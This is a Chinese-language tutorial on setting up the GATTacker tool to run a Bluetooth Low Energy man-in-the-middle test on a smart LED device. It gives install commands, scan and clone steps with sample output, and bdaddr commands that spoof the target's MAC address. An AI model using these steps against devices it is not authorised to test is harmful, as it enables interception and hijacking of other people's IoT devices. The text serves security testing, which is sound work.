GATTacker安装与使用

1. 安装GATTacker

   GATTacker依赖：

   [noble](https://github.com/noble/noble)

   [bleno](https://github.com/noble/bleno)

   [nodejs](https://nodejs.org/zh-cn/download/releases/) = 8.11.X，注意高版本编译不通过

   安装流程：

   注意，你需要同时配置两台设备安装GATTacker

   1. Ubuntu下安装依赖

      ```
      sudo apt-get install bluetooth bluez libbluetooth-dev libudev-dev
      ```

   2. 安装noble，bleno

      ```shell
      npm install noble
      npm install bleno
      ```

   3. 安装GATTacker

      ```shell
      npm install gattacker
      ```

      

2. GATTacker配置

   两台设备配置好GATTacker后，GATTacker项目地址在node_module/gattacker/下

   先看一下你插入的ble usb dongle属性：

   ```shell
   sudo hciconfig
   ```

   结果大概是这样：

   ```shell
   $ hciconfig
   hci0:   Type: BR/EDR  Bus: USB
       BD Address: 00:02:72:14:27:0E  ACL MTU: 1021:8  SCO MTU: 64:1
       DOWN 
       RX bytes:2715 acl:1 sco:0 events:146 errors:0
       TX bytes:2500 acl:0 sco:0 commands:133 errors:0
   ```

   

   第一台设备（扫描设备）配置config.env文件：

   取消**NOBLE_HCI_DEVICE_ID**注释，修改为上面看到的hciX，X修改为上面看到的0。

   ```shell
   NOBLE_HCI_DEVICE_ID=0
   # "peripheral" device emulator
   # BLENO_HCI_DEVICE_ID=1
   # advertising interval - minimal = 20ms
   BLE_ADVERTISING_INTERVAL=20
   # ws-slave websocket address
   ```

   

   第二台设备（控制设备）同样先看一下ble usb dongle的属性，然后配置config.env文件：

   ```shell
   取消NOBLE_HCI_DEVICE_ID注释
   取消BLENO_HCI_DEVICE_ID注释
   WS_SLAVE修改127.0.0.1为扫描设备的IP
   ```

   将它们分配给hciX值。

3. GATTacker使用

   第一台设备（扫描设备）进入目录node_modules/gattacker

   ```shell
   sudo node ws-slave.js
   ```

   

   

   第二台设备（控制设备）进入目录node_modules/gattacker

   ```shell
   sudo node scan.js # 扫描环境中ble信息
   ```

   发现目标后，你就可以扫描目标的ble service信息

   ```shell
   sudo node scan.js MAC
   ```

   扫描结束后会在devices文件夹下面出现目标的广播信息与service信息，其中广播信息以.adv.json结尾。

   ```bash
   {
   	"id" : "f81d7860753a",
   	"dir": "0201050703f0ffe5ffe0ff",
   	"scanResponse": "0319000010094c4544424c452d3738363037355541",
   	"decodedNonEditable": {
   		"localName": "LEDBLE-7860753A",
   		"manufacturerDataHex": null,
   		"manufacturerDataAsscii": null,
   		"serviceUuids": [
   		"fff0", "ffe5", "ffe0"
   		]
   	}
   }
   ```

   service信息为.srv.json结尾保存，格式与上边看到的差不多。

   收集信息结束，下面开始攻击了：

   先关闭你的ble外设。然后第二台设备（控制设备）上运行

   ```bash
   sudo node advertise.js -a devices/ADV.adv.json -s devices/SRV.srv.json #ADV.adv.json为刚才扫到的广播信息，SRV.srv.json为刚才扫到的service信息
   ```

   这条命令会模拟出一个和你目标一摸一样的ble外设，等待出现：

   ```bash
   on open
   poweredOn
   Noble MAC address : d0:17:c2:39:b9:9e
   ```

   现在给你的外设上电，等待第二台设备（控制设备）出现

   ```bash
   Static - start advertising
   on -> advertisingStart: success
   setServices: success
   <<<<<<<<<<<<<<<<<<<<<<INITIALIZED>>>>>>>>>>>>>>>>>>>>>>
   ```

   打开手机app，扫描链接ble外设，连接成功后，第二台设备（控制设备）中会出现如下：

   ```bash
   Client connected: 75:3a:23:79:0e:ac
   >> subscribe: ffe0 -> ffe4
   >> Write: ffe5 -> ffe9 : ef0177 ( w) f81d7860753a:ffe0 confirmed subscription state: ffe4
   << Notify: ffe0 -> ffe4 : 6615232a4110004b4b000a99 (f #*A KK   )
   >> Write: ffe5 -> ffe9 : 121a1b21 (   !)
   ```

   现在你可以使用app控制你的ble外设，看看中间有那些数据传递了

   

4. 问题：

   1. 成功率不高，一般会出现手机与ble外设连不上的情况，就算连上了，也可能出现数据不传递的情况，也就是控制失效，控制设备上抓不到任何包。

   2. 如果都成功，也可能出现报文漏掉的情况，我在测试过程中，发现报文漏掉的情况很多。

   3. 有些app是通过扫描外设的mac地址连接的，所以可能需要我们修改自己的ble dongle设备mac地址来尝试建立中间人链接：

      在helper/bdaddr下面通过make来编译adaddr，通过使用

      ```bash
      bdaddr -i hciX -r -t 目标ble设备mac # 克隆目标ble设备的mac
      ```

      然后按照上文中提到的方法继续测试就OK了。

   

   